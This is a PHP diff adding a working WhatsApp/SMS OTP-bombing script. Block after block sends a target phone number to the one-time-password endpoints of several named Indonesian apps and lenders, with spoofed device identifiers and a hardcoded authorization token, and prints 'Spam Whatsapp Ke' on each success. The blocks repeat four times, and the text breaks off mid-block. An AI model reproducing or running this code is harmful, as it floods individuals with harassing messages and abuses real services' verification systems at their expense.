@@ -10163,6 +10163,4545 @@ else{
 }
 
 
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
